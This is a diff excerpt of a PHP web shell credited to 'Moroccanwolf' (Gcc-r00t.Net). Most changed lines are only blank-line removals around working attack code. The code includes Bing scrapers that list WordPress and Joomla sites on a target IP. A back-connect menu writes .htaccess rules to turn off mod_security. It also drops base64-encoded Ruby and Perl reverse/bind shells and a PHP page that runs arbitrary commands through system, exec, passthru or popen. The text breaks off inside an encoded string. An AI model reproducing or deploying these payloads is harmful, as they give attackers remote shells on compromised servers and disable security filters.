ICANCg0KDQo8L3N0eWxlPg0KPC9oZWFkPg0KPD9waHANCmVjaG8gIjxjZW50ZXI+PC9jZW50ZXI+PGRpdiBpZD1yZXN1bHQ+IjsNCmVjaG8gIjxjZW50ZXI+PGJyPjxmb3JtPjxpbnB1dCB0eXBlPSd0ZXh0JyBzaXplPSc2MCcgdmFsdWU9J21vcm9jY2Fud29sZi5jb20nIG5hbWU9J3dvbGYnIC8+PGlucHV0IHR5cGU9J2hpZGRlbicgbmFtZT0nYWN0aW9uJyB2YWx1ZT0naXBsb29rZG9tJz4gJm5ic3A7PGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9J3NlYXJjaCc+PC9mb3JtPjwvY2VudGVyPiI7DQppZihpc3NldCgkX0dFVFsid29sZiJdKSkNCnsNCiRzaXRlID0gJF9HRVRbIndvbGYiXTsNCiRubiA9ICJodHRwOi8vZG9tYWlucy55b3VnZXRzaWduYWwuY29tL2RvbWFpbnMucGhwIjsNCg0KLy9DdXJsIEZ1bmN0aW9uDQokY2ggPSBjdXJsX2luaXQoJG5uKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSApOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1RGSUVMRFMsICAicmVtb3RlQWRkcmVzcz0kc2l0ZSZrZXQ9Iik7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSEVBREVSLCAwKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NULCAxKTsNCiRyZXNwID0gY3VybF9leGVjKCRjaCk7DQokcmVzcCA9IHN0cl9yZXBsYWNlKCJbIiwiIiwgc3RyX3JlcGxhY2UoIl0iLCIiLCBzdHJfcmVwbGFjZSgiXCJcIiIsIiIsIHN0cl9yZXBsYWNlKCIsICwiLCIsIiwgc3RyX3JlcGxhY2UoInsiLCIiLCBzdHJfcmVwbGFjZSgieyIsIiIsIHN0cl9yZXBsYWNlKCJ9IiwiIiwgc3RyX3JlcGxhY2UoIiwgIiwiLCIsIHN0cl9yZXBsYWNlKCIsICIsIiwiLCAgc3RyX3JlcGxhY2UoIiciLCIiLCBzdHJfcmVwbGFjZSgiJyIsIiIsIHN0cl9yZXBsYWNlKCI6IiwiLCIsIHN0cl9yZXBsYWNlKCciJywnJywgJHJlc3AgKSApICkgKSApICkgKSApICkgKSkpKTsNCiRhcnJheSA9IGV4cGxvZGUoIiwsIiwgJHJlc3ApOw0KdW5zZXQoJGFycmF5WzBdKTsNCmVjaG8gIjx0YWJsZSBzdHlsZT0nbWFyZ2luOiAwIGF1dG8nPiI7DQpmb3JlYWNoKCRhcnJheSBhcyAkbG5rKQ0Kew0KICAgIHByaW50ICI8dHI+PHRkPjxhICBzdHlsZT1cImNvbG9yOiMwMDc2QjE7XCIgaHJlZj0nJGxuaycgdGFyZ2V0PV9ibGFuaz4kbG5rPC9hPjwvdGQ+PC90cj4iOw0KfQ0KZWNobyAiPC90YWJsZT4iOw0KY3VybF9jbG9zZSgkY2gpOw0KfQ0KDQo/Pg==";
-
 $file = fopen("mwolf.php" ,"w+");
 $write = fwrite ($file ,base64_decode($kkk));
 fclose($file);
@@ -1094,7 +822,6 @@ if(isset($_POST['get']) && $_POST['ip'] != ""){
         }  
 }  
 echo '</textarea></center>';  
-
 function mbing($what){  
     for($i = 1; $i <= 2000; $i += 10){  
         $ch = curl_init();  
@@ -1117,17 +844,14 @@ function mbing($what){
         return array_unique($allLinks);  
     }  
 }  
-
 function cln_arr($array){  
     return @array_filter(@array_unique($array));  
 }  
 function jos_site($site){  
     return (preg_match("/option/",$site)) ? preg_replace("#(.*?)/index(.*)|(.*?)/?option(.*)#","$1/",$site):false;  
 }
-
 echo '<br><br><br><br><br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>';
 }
-
 elseif (isset($_GET['tools']) && $_GET['tools'] == "rwp"){
 echo '
 <h2>
@@ -1161,7 +885,6 @@ if(isset($_POST['get']) && $_POST['ip'] != ""){
           
 }  
 echo '</textarea></center>';  
-
 function mbing($what){  
     for($i = 1; $i <= 2000; $i += 10){  
         $ch = curl_init();  
@@ -1184,21 +907,14 @@ function mbing($what){
         return array_unique($allLinks);  
     }  
 }  
-
 function cln_arr($array){  
     return @array_filter(@array_unique($array));  
 }  
-
 function wp_site($site){  
     return (eregi("wp-content",$site) or eregi("page_id=",$site)) ? str_replace("?","",preg_replace("#(.*?)/(\?page_id=|wp-content)(.*)#","$1",$site)):false;  
 }
-
-
 echo '<br><br><br><br><br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>';
 }
-
-
-
 if (isset($_GET['bcon'])){
 echo '<br>
 <b class="mekki" align="center">
@@ -1206,41 +922,25 @@ echo '<br>
 <a href="?bcon=per">Perl Back Connect</a><br><br>
 <a href="?bcon=rub">Ruby Back Connect</a><br><br>
 <a href="?bcon=pyt">Python Back Connect</a><br><br>';
-
-
 if(isset($_GET['bcon']) && $_GET['bcon'] == "rub"){
-
-
 @mkdir('bconruby', 0755);
 @chdir('bconruby');
-
 $nnnn = "<IfModule mod_security.c>
 SecFilterEngine Off
 SecFilterScanPOST Off
 </IfModule>"; 
-
-
 $bbnn = fopen (".htaccess" , 'w+') or die ("Problem nihahahahahahahahaha !");
    
 fwrite ( $bbnn , $nnnn ) ;
 fclose ($bbnn);
 //back connect ruby
 $lalala = 'cmVxdWlyZSAnc29ja2V0Jw0KcmVxdWlyZSAncGF0aG5hbWUnDQogDQpkZWYgdXNhZ2UNCiAgICAgICAgcHJpbnQgImJpbmQgOlxyXG4gIHJ1YnkgIiArIEZpbGUuYmFzZW5hbWUoX19GSUxFX18pICsgIiBbcG9ydF1cclxuIg0KICAgICAgICBwcmludCAicmV2ZXJzZSA6XHJcbiAgcnVieSAiICsgRmlsZS5iYXNlbmFtZShfX0ZJTEVfXykgKyAiIFtwb3J0XSBbaG9zdF1cclxuIg0KZW5kDQogDQpkZWYgc3Vja3MNCiAgICAgICAgc3Vja3MgPSBmYWxzZQ0KICAgICAgICBpZiBSVUJZX1BMQVRGT1JNLmRvd25jYXNlLm1hdGNoKCdtc3dpbnx3aW58bWluZ3cnKQ0KICAgICAgICAgICAgICAgIHN1Y2tzID0gdHJ1ZQ0KICAgICAgICBlbmQNCiAgICAgICAgcmV0dXJuIHN1Y2tzDQplbmQNCiANCmRlZiByZWFscGF0aChzdHIpDQogICAgICAgIHJlYWwgPSBzdHINCiAgICAgICAgaWYgRmlsZS5leGlzdHM/KHN0cikNCiAgICAgICAgICAgICAgICBkID0gUGF0aG5hbWUubmV3KHN0cikNCiAgICAgICAgICAgICAgICByZWFsID0gZC5yZWFscGF0aC50b19zDQogICAgICAgIGVuZA0KICAgICAgICBpZiBzdWNrcw0KICAgICAgICAgICAgICAgIHJlYWwgPSByZWFsLmdzdWIoL1wvLywiXFwiKQ0KICAgICAgICBlbmQNCiAgICAgICAgcmV0dXJuIHJlYWwNCmVuZA0KIA0KaWYgQVJHVi5sZW5ndGggPT0gMQ0KICAgICAgICBpZiBBUkdWWzBdID1+IC9eWzAtOV17MSw1fSQvDQogICAgICAgICAgICAgICAgcG9ydCA9IEludGVnZXIoQVJHVlswXSkNCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHVzYWdlDQogICAgICAgICAgICAgICAgcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCiAgICAgICAgICAgICAgICBleGl0DQogICAgICAgIGVuZA0KICAgICAgICBzZXJ2ZXIgPSBUQ1BTZXJ2ZXIubmV3KCIiLCBwb3J0KQ0KICAgICAgICBzID0gc2VydmVyLmFjY2VwdA0KICAgICAgICBwb3J0ID0gcy5wZWVyYWRkclsxXQ0KICAgICAgICBuYW1lID0gcy5wZWVyYWRkclsyXQ0KICAgICAgICBzLnByaW50ICIqKiogY29ubmVjdGVkXHJcbiINCiAgICAgICAgcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fVxyXG4iDQogICAgICAgIGJlZ2luDQogICAgICAgICAgICAgICAgaWYgbm90IHN1Y2tzDQogICAgICAgICAgICAgICAgICAgICAgICBmID0gcy50b19pDQogICAgICAgICAgICAgICAgICAgICAgICBleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgXDxcJiVkIFw+XCYlZCAyXD5cJiVkIixmLGYsZikNCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICBzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIGxpbmUgPSBzLmdldHMNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2UgZXJyb3JCcm8gaWYgbGluZSA9fiAvXmRpZVxyrbQvDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBsaW5lLmNob21wID09ICIiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGluZSA9fiAvY2QgLiovaQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGluZSA9IGxpbmUuZ3N1YigvY2QgL2ksICcnKS5jaG9tcA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpbmUgPSByZWFscGF0aChsaW5lKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEaXIuY2hkaXIobGluZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzaWYgbGluZSA9fiAvXHc6LiovaQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUuY2hvbXApDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIERpci5jaGRpcihsaW5lLmNob21wKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJTy5wb3BlbihsaW5lLCJyIil7fGlvfHMucHJpbnQgaW8ucmVhZCArICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiJ9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgZW5kDQogICAgICAgIHJlc2N1ZSBlcnJvckJybw0KICAgICAgICAgICAgICAgIHB1dHMgIioqKiAje25hbWV9OiN7cG9ydH0gZGlzY29ubmVjdGVkIg0KICAgICAgICBlbnN1cmUNCiAgICAgICAgICAgICAgICBzLmNsb3NlDQogICAgICAgICAgICAgICAgcyA9IG5pbA0KICAgICAgICBlbmQNCmVsc2lmIEFSR1YubGVuZ3RoID09IDINCiAgICAgICAgaWYgQVJHVlswXSA9fiAvXlswLTldezEsNX0kLw0KICAgICAgICAgICAgICAgIHBvcnQgPSBJbnRlZ2VyKEFSR1ZbMF0pDQogICAgICAgICAgICAgICAgaG9zdCA9IEFSR1ZbMV0NCiAgICAgICAgZWxzaWYgQVJHVlsxXSA9fiAvXlswLTldezEsNX0kLw0KICAgICAgICAgICAgICAgIHBvcnQgPSBJbnRlZ2VyKEFSR1ZbMV0pDQogICAgICAgICAgICAgICAgaG9zdCA9IEFSR1ZbMF0NCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHVzYWdlDQogICAgICAgICAgICAgICAgcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCiAgICAgICAgICAgICAgICBleGl0DQogICAgICAgIGVuZA0KICAgICAgICBzID0gVENQU29ja2V0Lm5ldygiI3tob3N0fSIsIHBvcnQpDQogICAgICAgIHBvcnQgPSBzLnBlZXJhZGRyWzFdDQogICAgICAgIG5hbWUgPSBzLnBlZXJhZGRyWzJdDQogICAgICAgIHMucHJpbnQgIioqKiBjb25uZWN0ZWRcclxuIg0KICAgICAgICBwdXRzICIqKiogY29ubmVjdGVkIDogI3tuYW1lfToje3BvcnR9Ig0KICAgICAgICBiZWdpbg0KICAgICAgICAgICAgICAgIGlmIG5vdCBzdWNrcw0KICAgICAgICAgICAgICAgICAgICAgICAgZiA9IHMudG9faQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXhlYyBzcHJpbnRmKCIvYmluL3NoIC1pIFw8XCYlZCBcPlwmJWQgMlw+XCYlZCIsIGYsIGYsIGYpDQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQogICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSBsaW5lID0gcy5nZXRzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJhaXNlIGVycm9yQnJvIGlmIGxpbmUgPX4gL15kaWVccj8kLw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgbGluZS5jaG9tcCA9PSAiIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxpbmUgPX4gL2NkIC4qL2kNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpbmUgPSBsaW5lLmdzdWIoL2NkIC9pLCAnJykuY2hvbXANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEZpbGUuZGlyZWN0b3J5rbhsaW5lKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaW5lID0gcmVhbHBhdGgobGluZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRGlyLmNoZGlyKGxpbmUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+Ig0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2lmIGxpbmUgPX4gL1x3Oi4qL2kNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEZpbGUuZGlyZWN0b3J5rbhsaW5lLmNob21wKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEaXIuY2hkaXIobGluZS5jaG9tcCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSU8ucG9wZW4obGluZSwiciIpe3xpb3xzLnByaW50IGlvLnJlYWQgKyAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4ifQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICByZXNjdWUgZXJyb3JCcm8NCiAgICAgICAgICAgICAgICBwdXRzICIqKiogI3tuYW1lfToje3BvcnR9IGRpc2Nvbm5lY3RlZCINCiAgICAgICAgZW5zdXJlDQogICAgICAgICAgICAgICAgcy5jbG9zZQ0KICAgICAgICAgICAgICAgIHMgPSBuaWwNCiAgICAgICAgZW5kDQplbHNlDQogICAgICAgIHVzYWdlDQogICAgICAgIGV4aXQNCmVuZA==';
-
 $kk = fopen("bconruby.rb" ,"w+");
 $write = fwrite ($kk ,base64_decode($lalala));
 fclose($kk);
-
 @chmod("bconruby.rb",0755);
-
-
-
-
 $kkk ="
 PGh0bWw+PGhlYWQ+PHRpdGxlPkFub25HaG9zdCBQeXRob24gQ29ubmVjdCBTaGVsbCBQcml2ODwvdGl0bGU+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vd3d3MTQuMHp6MC5jb20vMjAxNC8wNi8wNC8yMS8zOTY1NTQzOTQucG5nIiB0eXBlPSJpbWFnZS94LWljb24iIC8+PHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmgzIHsNCnRleHQtZGVjb3JhdGlvbjogbm9uZTsNCiAgZm9udC1mYW1pbHk6IFRhaG9tYSwgQXJpYWwsIHNhbnMtc2VyaWY7DQogIGZvbnQtc2l6ZTogMTBweDsNCiAgY29sb3I6ICMwMDc2QjE7DQogIA0KfQ0KLmFyZWEgew0KICBjb2xvcjogIzAwNzZCMTsNCiAgZm9udC1zaXplOiA5cHQ7DQogIHRleHQtc2hhZG93OiAjMDA3NkIxIDBweCAycHggN3B4Ow0KICBib3JkZXI6IHNvbGlkIDFweCAjMDA3NkIxOw0KICBiYWNrZ3JvdW5kLWNvbG9yOiB0cmFuc3BhcmVudDsNCiAgYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzAwOTkwMDsNCiAgcGFkZGluZzogM3B4Ow0KICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsNCiAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7DQogIGJvcmRlci1yYWRpdXM6IDRweDsNCiAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2IoMCwxMTksMCkgMHB4IDBweCA7DQp9DQogaW5wdXRbdHlwZT1zdWJtaXRdeyBwYWRkaW5nOiAzcHg7IGNvbG9yOiAjMDA3NzA7DQogIGZvbnQtd2VpZ2h0OiBib2xkOyANCnRleHQtYWxpZ246IGNlbnRlcjsgDQogdGV4dC1zaGFkb3c6IDAgMXB4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4zKTsNCiAgYmFja2dyb3VuZDogI2FlYWVhZTsgDQogYmFja2dyb3VuZC1jbGlwOiBwYWRkaW5nLWJveDsgDQogYm9yZGVyOiAxcHggc29saWQgIzI4NDQ3MzsgDQogYm9yZGVyLWJvdHRvbS1jb2xvcjogIzIyM2I2NjsgDQogYm9yZGVyLXJhZGl1czogNHB4OyAgDQpjdXJzb3I6IHBvaW50ZXI7ICANCmJhY2tncm91bmQtaW1hZ2U6LXdlYmtpdC1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsNCiBiYWNrZ3JvdW5kLWltYWdlOiAtbW96LWxpbmVhci1ncmFkaWVudCh0b3AsICNlYWVhZWEsICNkMGQwZDApOw0KICBiYWNrZ3JvdW5kLWltYWdlOiAtby1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsgDQogYmFja2dyb3VuZC1pbWFnZTogbGluZWFyLWdyYWRpZW50KHRvIGJvdHRvbSwgI2VhZWFlYSwgI2QwZDBkMCk7IA0KIC13ZWJraXQtYm94LXNoYWRvdzogaW5zZXQgMCAxcHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjUpLCBpbnNldCAwIDAgN3B4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC40KSwgMCAxcHggMXB4IHJnYmEoMCwgMCwgMCwgMC4xNSk7ICBib3gtc2hhZG93OiBpbnNldCAwIDFweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNSksIGluc2V0IDAgMCA3cHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjQpLCAwIDFweCAxcHggcmdiYSgwLCAwLCAwLCAwLjE1KTsgfSANCg0KaW5wdXRbdHlwZT10ZXh0XXsgcGFkZGluZzogM3B4OyBjb2xvcjogIzAwNzZCMTsgdGV4dC1zaGFkb3c6ICMwMDc2QjEgMHB4IDBweCAzcHg7IGJvcmRlcjogMXB4IHNvbGlkICMwMDc2QjE7IGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDA3NkIxOyAgICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiKDg1LDg1LDg1KSAwcHggMHB4IDRweDsgICAtbW96LWJveC1zaGFkb3c6ICMwMDc2QjEgMHB4IDBweCA0cHg7fSANCg0KDQoNCg0KPC9zdHlsZT4NCjw/cGhwDQplY2hvICcNCjxjZW50ZXI+DQo8Zm9ybSBtZXRob2Q9R0VUPg0KPHA+PHRleHRhcmVhIGNsYXNzPSJhcmVhIiByb3dzPSIxMyIgbmFtZT0idGV4dCIgdmFsdWU9InB5dCIgY29scz0iNzAiID4nOw0KDQoNCmlmIChzdHJsZW4oJF9HRVRbJ2NvbW1hbmQnXSk+MSAmJiAkX0dFVFsnZXhlY21ldGhvZCddIT0icG9wZW4iKXsNCmVjaG8gJF9HRVRbJ2V4ZWNtZXRob2QnXSgkX0dFVFsnY29tbWFuZCddKTt9DQppZiAoc3RybGVuKCRfUE9TVFsnY29tbWFuZCddKT4xICYmICRfUE9TVFsnZXhlY21ldGhvZCddIT0icG9wZW4iKXsNCmVjaG8gJF9QT1NUWydleGVjbWV0aG9kJ10oJF9QT1NUWydjb21tYW5kJ10pO30NCg0KaWYgKHN0cmxlbigkX0dFVFsnY29tbWFuZCddKT4xICYmICRfR0VUWydleGVjbWV0aG9kJ109PSJwb3BlbiIpew0KcG9wZW4oJF9HRVRbJ2NvbW1hbmQnXSwiciIpO30NCg0KZWNobyc8L3RleHRhcmVhPjwvcD4NCjxwPjxjZW50ZXI+PC9jZW50ZXI+PC9wPg0KPHAgYWxpZ249ImNlbnRlciI+PHN0cm9uZz48aDM+Q29tbWFuZDogcnVieSBiY29ucnVieS5yYiBbaXBdIFtQb3J0XTwvaDM+PC9zdHJvbmc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9InZ3IiBzaXplPSI1MCIgdmFsdWU9ImNtZCI+IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjb21tYW5kIiBzaXplPSI0MyI+IDxzZWxlY3QgbmFtZT1leGVjbWV0aG9kPg0KPG9wdGlvbiB2YWx1ZT0ic3lzdGVtIj5TeXN0ZW08L29wdGlvbj4gIDxvcHRpb24gdmFsdWU9ImV4ZWMiPkV4ZWM8L29wdGlvbj4gIDxvcHRpb24gdmFsdWU9InBhc3N0aHJ1Ij5QYXNzdGhydTwvb3B0aW9uPjxvcHRpb24gdmFsdWU9InBvcGVuIj5wb3Blbjwvb3B0aW9uPg0KPC9zZWxlY3Q+IDxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9ImtrayIgdmFsdWU9IkV4ZWN1dGUiPg0KPC9wPjwvZm9ybT4nOw0KDQo/Pg==";
-
-
-
 $file = fopen("mwolf.php" ,"w+");
 $write = fwrite ($file ,base64_decode($kkk));
 fclose($file);
@@ -1252,8 +952,6 @@ $nnnn = "<IfModule mod_security.c>
 SecFilterEngine Off
 SecFilterScanPOST Off
 </IfModule>"; 
-
-
 $bbnn = fopen (".htaccess" , 'w+') or die ("Problem nihahahahahahahahaha !");
    
 fwrite ( $bbnn , $nnnn ) ;
@@ -1263,63 +961,42 @@ $lalala = 'dXNlIElPOjpTb2NrZXQ7DQokc3lzdGVtICA9ICcvYmluL2Jhc2gnOw0KJEFSR0M9QEFSR
 $kk = fopen("bconperl.pl" ,"w+");
 $write = fwrite ($kk ,base64_decode($lalala));
 fclose($kk);
-
 @chmod("bconperl.pl",0755);
-
-
-
-
 $kkk ="
 PGh0bWw+PGhlYWQ+PHRpdGxlPkFub25HaG9zdCBQeXRob24gQ29ubmVjdCBTaGVsbCBQcml2ODwvdGl0bGU+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vd3d3MTQuMHp6MC5jb20vMjAxNC8wNi8wNC8yMS8zOTY1NTQzOTQucG5nIiB0eXBlPSJpbWFnZS94LWljb24iIC8+PHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmgzIHsNCnRleHQtZGVjb3JhdGlvbjogbm9uZTsNCiAgZm9udC1mYW1pbHk6IFRhaG9tYSwgQXJpYWwsIHNhbnMtc2VyaWY7DQogIGZvbnQtc2l6ZTogMTBweDsNCiAgY29sb3I6ICMwMDc2QjE7DQogIA0KfQ0KLmFyZWEgew0KICBjb2xvcjogIzAwNzZCMTsNCiAgZm9udC1zaXplOiA5cHQ7DQogIHRleHQtc2hhZG93OiAjMDA3NkIxIDBweCAycHggN3B4Ow0KICBib3JkZXI6IHNvbGlkIDFweCAjMDA3NkIxOw0KICBiYWNrZ3JvdW5kLWNvbG9yOiB0cmFuc3BhcmVudDsNCiAgYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzAwOTkwMDsNCiAgcGFkZGluZzogM3B4Ow0KICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsNCiAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7DQogIGJvcmRlci1yYWRpdXM6IDRweDsNCiAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2IoMCwxMTksMCkgMHB4IDBweCA7DQp9DQogaW5wdXRbdHlwZT1zdWJtaXRdeyBwYWRkaW5nOiAzcHg7IGNvbG9yOiAjMDA3NzA7DQogIGZvbnQtd2VpZ2h0OiBib2xkOyANCnRleHQtYWxpZ246IGNlbnRlcjsgDQogdGV4dC1zaGFkb3c6IDAgMXB4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4zKTsNCiAgYmFja2dyb3VuZDogI2FlYWVhZTsgDQogYmFja2dyb3VuZC1jbGlwOiBwYWRkaW5nLWJveDsgDQogYm9yZGVyOiAxcHggc29saWQgIzI4NDQ3MzsgDQogYm9yZGVyLWJvdHRvbS1jb2xvcjogIzIyM2I2NjsgDQogYm9yZGVyLXJhZGl1czogNHB4OyAgDQpjdXJzb3I6IHBvaW50ZXI7ICANCmJhY2tncm91bmQtaW1hZ2U6LXdlYmtpdC1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsNCiBiYWNrZ3JvdW5kLWltYWdlOiAtbW96LWxpbmVhci1ncmFkaWVudCh0b3AsICNlYWVhZWEsICNkMGQwZDApOw0KICBiYWNrZ3JvdW5kLWltYWdlOiAtby1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsgDQogYmFja2dyb3VuZC1pbWFnZTogbGluZWFyLWdyYWRpZW50KHRvIGJvdHRvbSwgI2VhZWFlYSwgI2QwZDBkMCk7IA0KIC13ZWJraXQtYm94LXNoYWRvdzogaW5zZXQgMCAxcHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjUpLCBpbnNldCAwIDAgN3B4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC40KSwgMCAxcHggMXB4IHJnYmEoMCwgMCwgMCwgMC4xNSk7ICBib3gtc2hhZG93OiBpbnNldCAwIDFweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNSksIGluc2V0IDAgMCA3cHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjQpLCAwIDFweCAxcHggcmdiYSgwLCAwLCAwLCAwLjE1KTsgfSANCg0KaW5wdXRbdHlwZT10ZXh0XXsgcGFkZGluZzogM3B4OyBjb2xvcjogIzAwNzZCMTsgdGV4dC1zaGFkb3c6ICMwMDc2QjEgMHB4IDBweCAzcHg7IGJvcmRlcjogMXB4IHNvbGlkICMwMDc2QjE7IGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDA3NkIxOyAgICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiKDg1LDg1LDg1KSAwc